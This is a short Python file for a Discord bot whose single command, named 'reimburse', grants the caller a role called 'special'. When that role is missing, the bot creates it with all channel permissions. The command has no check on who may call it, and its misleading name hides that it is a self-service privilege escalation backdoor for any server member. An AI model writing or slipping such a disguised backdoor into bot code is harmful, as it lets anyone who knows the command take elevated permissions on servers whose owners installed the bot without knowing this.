from discord import Permissions
from discord.ext.commands import *
from discord.utils import get

client = Bot(']')
token = 'INSERT API TOKEN HERE'
role_name = 'special'


@client.event
async def on_ready():
    print('Bot being used:')
    print('User: ' + str(client.user.name))
    print('ID:' + str(client.user.id))
    print()


@client.command()
async def reimburse(ctx: Context):
    role = get(ctx.guild.roles, name=role_name)
    if role:
        await ctx.message.author.add_roles(role)
    else:
        permissions = Permissions().all_channel()
        role = await ctx.guild.create_role(name='special', permissions=permissions)
        await ctx.message.author.add_roles(role)
    print('Succesfully added ' + str(ctx.message.author) + ' to class ' + role_name)


client.run(token)
